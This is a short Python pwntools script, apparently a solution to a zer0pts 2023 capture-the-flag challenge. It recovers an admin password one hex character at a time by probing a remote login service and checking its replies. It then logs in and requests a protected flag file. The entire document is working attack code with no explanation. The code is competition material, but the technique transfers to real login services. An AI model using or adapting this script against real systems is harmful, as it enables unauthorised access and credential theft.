#!/usr/bin/env python3

import sys
import time

from pwn import *

password = b"dd79efc4093c932"

context.log_level = 'ERROR'
while len(password) < 16:
    results = []
    for i in "abcdef0123456789":
        sys.stdout.write(".")
        sys.stdout.flush()
        # io = remote("localhost", 10021)
        io = remote("misc.2023.zer0pts.com", 10021)
        io.sendlineafter(b"Username: ", b"admin")
        c = i.encode()
        # c = bytes([i])
        io.sendafter(b"Password: ", password + c)
        resp = io.recvline(timeout=1).decode()
        io.close()
        if "Incorrect" in resp:
            continue
        password += c
        break
    print(f"\n{password}")

io = remote("misc.2023.zer0pts.com", 10021)
io.sendlineafter(b"Username: ", b"admin")
io.sendlineafter(b"Password: ", password)
io.sendlineafter(b"File: ", b"secret/flag.txt")
io.interactive()
